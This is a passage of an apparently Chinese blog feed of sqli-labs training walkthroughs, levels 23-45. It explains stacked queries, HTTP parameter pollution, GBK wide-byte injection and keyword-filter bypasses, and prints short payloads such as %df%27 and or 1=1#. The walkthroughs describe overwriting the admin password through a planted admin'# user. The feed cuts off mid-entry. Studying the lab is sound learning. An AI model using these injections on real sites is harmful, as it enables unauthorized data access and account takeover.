    <title>sql-labs38-45</title>
    <link href="https://Foxgrin.github.io//posts/5994/"/>
    <id>https://Foxgrin.github.io//posts/5994/</id>
    <published>2018-07-09T08:07:00.000Z</published>
    <updated>2018-07-09T13:33:44.949Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中堆叠注入的一些关卡<a id="more"></a></p><h2 id="Less38-45"><a href="#Less38-45" class="headerlink" title="Less38-45"></a>Less38-45</h2><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>一开始做这关发现跟之前关卡没有什么区别，可以正常的注出数据库等信息 </p><p><img src="/img/sql-labs38-45/1.png" alt=""></p><p>但是这关要考察的是堆叠注入，也就是多语句查询，我们在mysql命令行中就可以验证，在前面一个sql语句结尾加上;，再加入一个sql语句，mysql就会一起执行这两个sql语句 </p><p><img src="/img/sql-labs38-45/2.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出两个语句都执行了</p><p>然而在之前关卡试了一下，是不能堆叠注入，看看这关源代码，发现与之前关卡连接数据库的方式变化了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里用了mysqli函数来连接数据库 </p><p>查询一下mysqli连接方式跟之前mysql连接方式，大致区别就是mysqli是一种新型的连接方式，然后应用在本关就能支持堆叠注入，原因它有个支持多查询的函数 </p><p><img src="/img/sql-labs38-45/5.png" alt=""></p><p>由于第二个查询是网页上是看不到结果，即使有错误信息也是看不到的，所以一般不用查询语句来堆叠注入</p><p>例如可以进行一些数据库数据表的增删改操作，然后在mysql命令行进行验证</p><p>例如创建一个数据表test</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>删去表test </p><p><img src="/img/sql-labs38-45/8.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>往users表中添加信息 </p><p><img src="/img/sql-labs38-45/10.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>即使第二条语句出现错误，我们也不会看到报错信息，所以一定要保证输入的语句不会出现错误 </p><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这关跟上一关区别就在于id没有被包裹 </p><p><img src="/img/sql-labs38-45/12.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>这关id值被(‘’)包裹，其他的跟之前没区别 </p><p><img src="/img/sql-labs38-45/16.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>测试一下延时注入是否使用在堆叠注入 </p><p><img src="/img/sql-labs38-45/18.png" alt=""></p><p>经过测试是不行的，因为服务器只会返回给我们的第一个语句查询结果，第二个语句虽然会执行，但是结果是不会返回给我们的 </p><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>这关id没有被包裹，其余与之前关卡无区别 </p><p><img src="/img/sql-labs38-45/19.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>刚进入这关从页面来看有点像之前的二次注入，之前的二次注入思路是创建一个名为admin’#的用户，然后登陆这个用户，修改密码，由于修改密码页面的sql语句条件中的username是直接从session中取的，不经过过滤，所以通过二次注入，最终修改了admin用户的密码</p><p>而这关想创建新用户，发现</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示我们如果要创建新用户，就用黑客的方法</p><p>我们想到这几关的主题，堆叠注入，那么是不是可以通过堆叠注入，将admin’#用户名直接写入users表中，这样就不需要通过之前创建用户的方式来二次注入</p><p>看一下login.php的源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然允许多查询</p><p>那么来找找注入点</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现password未经过过滤，所以我们就在password进行注入 </p><p><img src="/img/sql-labs38-45/24.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功登陆 </p><p><img src="/img/sql-labs38-45/26.png" alt=""></p><p>并且添加admin’#</p><p>接下来登陆admin’#</p><p>并修改密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现admin密码被修改，成功通过堆叠注入实现二次注入</p><p>其他数据库和数据表增添，删改和之前关卡一样</p><p>另外本关还可以报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Password被（‘’）包裹，方法与上一关相同 </p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>这关没有报错信息，所以只能先延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs38-45/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>被单引号包裹</p><p>其他与之前关卡相同，就是不能报错注入了</p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>一样没有报错信息，延时注入 </p><p><img src="/img/sql-labs38-45/38.png" alt=""></p><p>被(‘’)包裹，其他与之前相同 </p>]]></content>
    
    <summary type="html">
    
      sql-labs38-45
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs29-37</title>
    <link href="https://Foxgrin.github.io//posts/56021/"/>
    <id>https://Foxgrin.github.io//posts/56021/</id>
    <published>2018-07-09T07:13:00.000Z</published>
    <updated>2018-07-09T13:33:44.949Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中HTTP参数污染和宽字节注入的一些关卡<a id="more"></a></p><h2 id="Less29-37"><a href="#Less29-37" class="headerlink" title="Less29-37"></a>Less29-37</h2><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先页面信息展示的是“这个页面受到世界上最好的防火墙的保护” n</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>经过一系列盲注，发现都没有什么特别的地方</p><p>看一下源码，发现这关有隐藏的登录页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入id=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入id=1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现直接跳转到另外一个页面，尝试一系列盲注，都被防火墙拦截下来 </p><p>看一下login.php的源码 </p><p><img src="/img/sql-labs29-37/6.png" alt=""></p><p>首先，我们输入的请求信息以字符串的方式被截取下来 </p><p><img src="/img/sql-labs29-37/7.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后这个字符串被以&amp;为分隔符组合成数组 </p><p>并且如果有一个元素是id=(某个值)，这个值被截取下来赋值给id_value </p><p><img src="/img/sql-labs29-37/9.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>并判断这个值，如果不是完全由数字组成的，则跳转到被防火墙拦截页面</p><p>这个处理实际上就是服务器处理数据的原理</p><p>http服务器实际上有两个，当客户端发送请求数据给服务器时，数据会先经过第一个tomcat服务器，tomcat服务器先处理第一个请求参数，再将数据交给第二个apache服务器，apache服务器处理最后一个请求参数，将结果返回给tomcat,tomcat再返回给客户端</p><p>也就是说当我们输入/login.php?id=1&amp;id=2，最后服务器处理的是id=2这个参数，也就是最后一个参数</p><p>这关的代码实际上就是模仿在tomcat服务器设置防火墙，从而进行数据过滤，防止攻击</p><p>所以我们就可以用第一个参数骗过服务器，通过最后一个参数进行sql注入，这就属于hpp，也就是http参数污染漏洞攻击</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第一个参数输入纯数字，第二个参数进行注入</p><p>剩下的就跟之前相同了</p><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>这题跟上题区别在于id被双引号包裹，其他方法跟上题相同 </p><p><img src="/img/sql-labs29-37/12.png" alt=""></p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>这题id被(“”)包裹，其余和前两题一样 </p><p><img src="/img/sql-labs29-37/13.png" alt=""></p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>输入id=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入id=1’ </p><p><img src="/img/sql-labs29-37/15.png" alt=""></p><p>发现我们输入的值被经过处理了</p><p>查看源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Preg_quote()这个函数作用是在正则表达式中将特殊字符转义，比如一些在正则表达式中具有特殊意义的字符*-?等，如果不加以转义会被认为是特殊字符无法替换</p><p>还有php字符串中一个反斜杠应该写成’\’，将一个反斜杠加以转义，使其成为真正意义上的反斜杠而不是转义字符</p><p>所以首先检查字符串，如果其中有一个反斜杠，就将其替换成三个反斜杠，不要纠结为什么是三个，这是官方文档的规定，简单来说就是我们输入一个反斜杠时将这个反斜杠转义就是了</p><p>第二次检查字符串中如果有’则被替换成\’，就是将单引号转义</p><p>第三次就是将双引号转义</p><p>所以对我们输入的单引号，反斜杠和双引号进行了转义</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这个函数的作用就是设置mysql的set-character-client 和 set-character-connection 和</p><p>Set-character-results三个参数的值设置为gbk编码</p><p>很容易联想到宽字节注入</p><p>我们在客户端输入id的值后，经过php服务器提交给mysql，mysql将接受的数据经过set-character-client的编码方式进行编码，再用set-character-connection的编码方式进行编码，然后进入数据库和数据表，根据库和表的默认编码方式进行编码，再将查询结果根据set-character-results编码返回给客户端</p><p>而gbk编码方式会将字符串中的两个字符看作是一个汉字，前提是前一个字符的ascii码大于128，所以我们输入id=%df%27时，经由过滤变成’%df%5c%27’，然后经过mysql的编码，认为%df%5c是一个汉字，从而造成单引号不被转义，造成前面单引号不闭合，从而注入</p><p>所以只要解决单引号被转义的问题，就与前面关卡没什么区别了</p><p>下面爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里注意如果输入table_name=’users’，单引号会被转义，可以把users转成十六进制，从而避免使用单引号 </p><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这关与上一关区别在于使用了addslashes这个函数 </p><p><img src="/img/sql-labs29-37/24.png" alt=""></p><p>这个函数可以将单引号，双引号和反斜杠转义</p><p>实际上与上一关功能相同，只不过这个函数可以实现上一关的三个替换功能</p><p>一样在单引号前面加上%df即可正常注入</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这关用了POST提交表单的方法，依然对单引号，双引号和反斜杠有转义 </p><p><img src="/img/sql-labs29-37/25.png" alt=""></p><p>查询语句如下： </p><p><img src="/img/sql-labs29-37/26.png" alt=""></p><p>与之前关卡区别在于，之前是GET方式提交的请求，而我们输入的GET参数是会经过url解码的，而POST则不会经过url解码，所以我们如果按照之前的方法输入username=admin%df’，发现%df不会被解码</p><p>所以不如我们替它解码，%df经过url解码后为字符�，所以我们可以输入admin�’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然有报错了</p><p>那么接下来又思考如何注出用户名和密码，因为username列的数据类型是字符串，不像是之前关卡id列的数据类型是整型，所以此处我们用万能密码</p><p>Username=�’ or 1=1#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功注出了用户名和密码</p><p>结合查询语句</p><p>Select * from users where username=’’ and password=’’ limit 0,1</p><p>Select * from users where username=’ �\’ or 1=1</p><p>Gbk编码将�和\看做一个汉字，or语句逻辑运算，因为1=1恒为1所以条件恒为真，注出users表中所有用户名和密码</p><p>在mysql命令行验证一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么要注出下面几行的用户名和密码我们只需要加个limit n,1就ok了 </p><p><img src="/img/sql-labs29-37/30.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>其他注入和之前一样</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里如果用and会导致前面为假而后面不执行，所以改成or </p><p><img src="/img/sql-labs29-37/36.png" alt=""></p><p>延时注入</p><p>关于延时注入，之前碰到的都是能前面id=某个数字能查到，然后根据某个判断条件执行sleep进行延时注入</p><p>而本关注入点username数据类型是字符串，也就是说必须跟列下数据完全一样，才能查的到值，而本关我们要注入，则必须要过滤转义字符从而使单引号逃逸，也就是我们过滤后username的值肯定不可能跟表里的值有相同的，即不能保证前面的值为真，要延时注入，就得用or sleep，or的执行条件前面为前面的条件为假</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>先查一下users表中又十四行数据</p><p>那我们进行延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见sleep了14秒，因为mysql要对每行数据进行查询，判断username有没有等于1的，如果没有，则执行sleep 1秒，总共要查询14行，14行都没有符合的，所以sleep了总共14秒</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而如果是and的话，则是查询到数据才会执行sleep 1秒 </p><p><img src="/img/sql-labs29-37/40.png" alt=""></p><p>在看看之前的过滤单引号的关卡构造闭合单引号的注入语句</p><p>为什么能查出所有数据</p><p>我觉得应该这样划分(username=‘admin’ and sleep(5)) or ‘1’=’1’，先查有没有等于admin的，如果没有不执行sleep，然后会执行or，执行结果为1.</p><p>如果有等于admin的，则执行sleep，但在要执行时，执行了or语句，结果1,不延迟</p><p>所以最终结果不管username的值有没有出现在表中，结果都为1，不会执行sleep</p><p>要进行注入的话，就必须将or换成and</p><p>所以本关延迟注入如图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>试一下id=1%df’%23</p><p>发现报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明id没有任何包裹，所以本关也不需要宽字节注入，相当于之前的关卡了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这关跟之前区别在于转义函数用了mysql_real_escape_string() </p><p><img src="/img/sql-labs29-37/44.png" alt=""></p><p>但由于我们set names gbk，所以还是能用宽字节注入的方法，跟之前关卡一样</p><p>下面总结一下再使用addslashes和mysql_real_escape_string如何防御宽字节注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/46.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs29-37/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟之前post关卡一样，只是用了mysql_real_escape_string </p><p>HTTP参数污染参考链接：<a href="http://www.freebuf.com/articles/web/5908.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/5908.html</a></p><p>宽字节注入参考链接：<a href="https://mp.weixin.qq.com/s/WjGaDxwaBkOzCe2BWGak2A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WjGaDxwaBkOzCe2BWGak2A</a></p>]]></content>
    
    <summary type="html">
    
      sql-labs29-37
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs23-28</title>
    <link href="https://Foxgrin.github.io//posts/38551/"/>
    <id>https://Foxgrin.github.io//posts/38551/</id>
    <published>2018-07-09T05:31:00.000Z</published>
    <updated>2018-07-09T13:33:44.950Z</updated>
    
    <content type="html"><![CDATA[<p>总结一些sql-labs中带有过滤关键字的关卡<a id="more"></a></p><h2 id="Less23-28"><a href="#Less23-28" class="headerlink" title="Less23-28"></a>Less23-28</h2><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关对注释符–+和#有过滤</p><p>因为id被单引号包裹</p><p>解决方法是通过构造payload来闭合单引号</p><p>爆数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果采取报错注入的话，还有一种方法是通过or ‘1’=’1闭合单引号 </p><p><img src="/img/sql-labs23-28/6.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果用count(<em>),group by,floor(rand(0)</em>2)则要用and ‘1’=’1才会报错 </p><p><img src="/img/sql-labs23-28/8.png" alt=""></p><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>此处如果用or ‘1’=’1的话会导致后面恒为真，导致前面的sleep不被执行，所以应当换成and ‘1’=’1</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>从源代码可以分析出对关键字or 和and有过滤，并且不区分大小写</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于只过滤一次，所以可以用复写关键字的方法注入关键字or和and</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>这关没有报出错误信息，所以考虑用延时注入 </p><p><img src="/img/sql-labs23-28/19.png" alt=""></p><p>看出id没有被引号包裹 </p><p><img src="/img/sql-labs23-28/20.png" alt=""></p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从源代码分析出过滤了关键字and,or,/*,–,#,空格,/</p><p>解决方法:(1)双写and 和 or</p><p>​                (2)使用or ‘1’=’1 闭合单引号</p><p>​         (3) %09    TAB键（水平）</p><p>​            %0a    新建一行</p><p>​            %0b    TAB键（垂直）</p><p>​            %0c    新的一页</p><p>​            %0d    return功能</p><p>​            %a0    空格</p><p>替代空格，但经过尝试，window下以上所有字符都替代不了空格，迫于无奈只好将源码中过滤空格的语句注释</p><p>延时注入 </p><p><img src="/img/sql-labs23-28/22.png" alt=""></p><p>报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>联合注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>这题没有报错信息，其余与上题一致</p><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看出id被(‘’)包裹</p><p>因为没有报错信息，所以无法用报错注入</p><p>于是用联合注入</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img 